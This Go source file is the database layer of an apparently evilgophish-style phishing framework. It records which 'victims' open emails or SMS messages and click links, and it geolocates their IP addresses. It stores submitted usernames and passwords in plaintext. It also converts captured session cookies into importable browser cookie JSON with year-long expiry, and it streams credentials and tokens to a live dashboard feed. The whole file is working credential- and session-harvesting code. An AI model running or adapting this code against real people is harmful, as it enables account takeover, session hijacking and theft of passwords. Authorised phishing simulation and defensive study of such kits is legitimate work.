package database

import (
	"encoding/json"
	"strconv"

	"github.com/tidwall/buntdb"

	"fmt"
	"net/url"
	"time"

	"net"
	"os"

	"github.com/gorilla/websocket"
	"github.com/jinzhu/gorm"
	_ "github.com/mattn/go-sqlite3"
	"github.com/oschwald/geoip2-golang"
)

var gp_db *gorm.DB
var geoDB *geoip2.Reader

type Database struct {
	path string
	db   *buntdb.DB
}

type BaseRecipient struct {
	Email     string `json:"email"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Position  string `json:"position"`
}

type Result struct {
	Id           int64     `json:"-"`
	CampaignId   int64     `json:"-"`
	UserId       int64     `json:"-"`
	RId          string    `json:"id"`
	Status       string    `json:"status" sql:"not null"`
	IP           string    `json:"ip"`
	Latitude     float64   `json:"latitude"`
	Longitude    float64   `json:"longitude"`
	SendDate     time.Time `json:"send_date"`
	Reported     bool      `json:"reported" sql:"not null"`
	ModifiedDate time.Time `json:"modified_date"`
	BaseRecipient
	SMSTarget bool `json:"sms_target"`
}

type Event struct {
	Id         int64     `json:"-"`
	CampaignId int64     `json:"campaign_id"`
	Email      string    `json:"email"`
	Time       time.Time `json:"time"`
	Message    string    `json:"message"`
	Details    string    `json:"details"`
}

type EventDetails struct {
	Payload url.Values        `json:"payload"`
	Browser map[string]string `json:"browser"`
}

type EventError struct {
	Error string `json:"error"`
}

type GeoData struct {
	City    string  `json:"city"`
	Country string  `json:"country"`
	Lat     float64 `json:"lat"`
	Lon     float64 `json:"lon"`
}

type FeedEvent struct {
	Type      string  `json:"type"`
	Event     string  `json:"event"`
	Time      string  `json:"time"`
	Timestamp int64   `json:"timestamp"`
	Message   string  `json:"message"`
	Tokens    string  `json:"tokens"`
	Username  string  `json:"username"`
	Password  string  `json:"password"`
	IP        string  `json:"ip"`
	Phishlet  string  `json:"phishlet"`
	SessionId string  `json:"session_id"`
	Geo       GeoData `json:"geo"`
	Score     int     `json:"score"`
}

func SetupGPDB(path string) error {
	// Open our database connection
	var err error
	i := 0
	for {
		gp_db, err = gorm.Open("sqlite3", path)
		if err == nil {
			break
		}
		if err != nil && i >= 10 {
			fmt.Printf("Error connecting to evilgophish.db: %s\n", err)
			return err
		}
		i += 1
		fmt.Println("waiting for database to be up...")
		time.Sleep(5 * time.Second)
	}

	// Initialize GeoIP database if available
	if _, err := os.Stat("GeoLite2-City.mmdb"); err == nil {
		geoDB, err = geoip2.Open("GeoLite2-City.mmdb")
		if err != nil {
			fmt.Printf("Error opening GeoIP database: %s\n", err)
		} else {
			fmt.Println("GeoIP database loaded successfully")
		}
	} else {
		fmt.Println("GeoLite2-City.mmdb not found, GeoIP features disabled")
	}

	return nil
}

func getGeoData(ipStr string) GeoData {
	geo := GeoData{}
	if geoDB == nil {
		return geo
	}

	ip := net.ParseIP(ipStr)
	if ip == nil {
		return geo
	}

	record, err := geoDB.City(ip)
	if err != nil {
		return geo
	}

	geo.City = record.City.Names["en"]
	geo.Country = record.Country.Names["en"]
	geo.Lat = record.Location.Latitude
	geo.Lon = record.Location.Longitude

	return geo
}

func moddedCookieTokensToJSON(tokens map[string]map[string]*CookieToken) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func moddedTokensToJSON(tokens map[string]string) string {
	jsonString, err := json.Marshal(tokens)
	if err != nil {
		fmt.Println("Error encoding token strings to JSON:", err)
		return ""
	}
	return string(jsonString)
}

func AddEvent(e *Event, campaignID int64) error {
	e.CampaignId = campaignID
	e.Time = time.Now().UTC()

	return gp_db.Save(e).Error
}

func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
	e := &Event{Email: r.Email, Message: status}
	if details != nil {
		dj, err := json.Marshal(details)
		if err != nil {
			return nil, err
		}
		e.Details = string(dj)
	}
	AddEvent(e, r.CampaignId)
	return e, nil
}

func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool, phishlet string) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"client_id": []string{rid}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = browser["address"]
		geo := getGeoData(res.IP)
		res.Latitude = geo.Lat
		res.Longitude = geo.Lon
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Email/SMS Opened", ed)
		if err != nil {
			return err
		}
		res.Status = "Email/SMS Opened"
		res.ModifiedDate = event.Time
		if feed_enabled {
			if r.SMSTarget {
				err = res.NotifySMSOpened(phishlet)
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			} else {
				err = res.NotifyEmailOpened(phishlet)
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			}
		}
		if r.Status == "Clicked Link" || r.Status == "Submitted Data" || r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool, phishlet string) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"client_id": []string{rid}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = browser["address"]
		geo := getGeoData(res.IP)
		res.Latitude = geo.Lat
		res.Longitude = geo.Lon
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		if feed_enabled {
			if r.Status == "Email/SMS Sent" {
				HandleEmailOpened(rid, browser, true, phishlet)
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
				err = res.NotifyClickedLink(phishlet)
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			} else {
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
				err = res.NotifyClickedLink(phishlet)
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			}
		} else {
			if r.Status == "Email/SMS Sent" {
				HandleEmailOpened(rid, browser, false, phishlet)
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
			} else {
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
			}
		}
		if r.Status == "Submitted Data" || r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleSubmittedData(rid string, username string, password string, browser map[string]string, feed_enabled bool, phishlet string) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"Username": []string{username}, "Password": []string{password}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = browser["address"]
		geo := getGeoData(res.IP)
		res.Latitude = geo.Lat
		res.Longitude = geo.Lon
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Submitted Data", ed)
		if err != nil {
			return err
		}
		res.Status = "Submitted Data"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifySubmittedData(username, password, phishlet)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		if r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, feed_enabled bool, phishlet string) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		json_tokens := moddedCookieTokensToJSON(tokens)
		ed.Payload = map[string][]string{"Tokens": {json_tokens}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = browser["address"]
		geo := getGeoData(res.IP)
		res.Latitude = geo.Lat
		res.Longitude = geo.Lon
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Captured Session", ed)
		if err != nil {
			return err
		}
		res.Status = "Captured Session"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifyCapturedCookieSession(tokens, phishlet)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		return gp_db.Save(res).Error
	}
}

func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, feed_enabled bool, phishlet string) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		json_tokens := moddedTokensToJSON(tokens)
		ed.Payload = map[string][]string{"Tokens": {json_tokens}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = browser["address"]
		geo := getGeoData(res.IP)
		res.Latitude = geo.Lat
		res.Longitude = geo.Lon
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Captured Session", ed)
		if err != nil {
			return err
		}
		res.Status = "Captured Session"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifyCapturedOtherSession(tokens, phishlet)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		return gp_db.Save(res).Error
	}
}

func (r *Result) NotifyEmailOpened(phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "open"
	fe.Event = "Email Opened"
	fe.Message = "Email has been opened by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 10
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifySMSOpened(phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "open"
	fe.Event = "SMS Opened"
	fe.Message = "SMS has been opened by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 10
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyClickedLink(phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "click"
	fe.Event = "Clicked Link"
	fe.Message = "Link has been clicked by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 30
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifySubmittedData(username string, password string, phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "credentials"
	fe.Event = "Submitted Data"
	fe.Message = "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	fe.Username = username
	fe.Password = password
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 80
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*CookieToken, phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "session"
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	json_tokens := moddedCookieTokensToJSON(tokens)
	fe.Tokens = json_tokens
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 100
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyCapturedOtherSession(tokens map[string]string, phishlet string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "session"
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
	fe.Time = r.ModifiedDate.String()
	fe.Timestamp = r.ModifiedDate.UnixMilli()
	json_tokens := moddedTokensToJSON(tokens)
	fe.Tokens = json_tokens
	fe.Phishlet = phishlet
	fe.IP = r.IP
	fe.SessionId = r.RId
	fe.Geo = getGeoData(r.IP)
	fe.Score = 100
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func HandleBlockedRequest(ip string, userAgent string, reason string, feed_enabled bool, phishlet string) error {
	if !feed_enabled {
		return nil
	}
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Type = "bot"
	fe.Event = "Request Blocked"
	fe.Message = "Blocked request from <strong>" + ip + "</strong> (" + reason + ")"
	fe.Time = time.Now().UTC().String()
	fe.Timestamp = time.Now().UTC().UnixMilli()
	fe.Phishlet = phishlet
	fe.IP = ip
	fe.Geo = getGeoData(ip)
	fe.Score = 0
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	return err
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
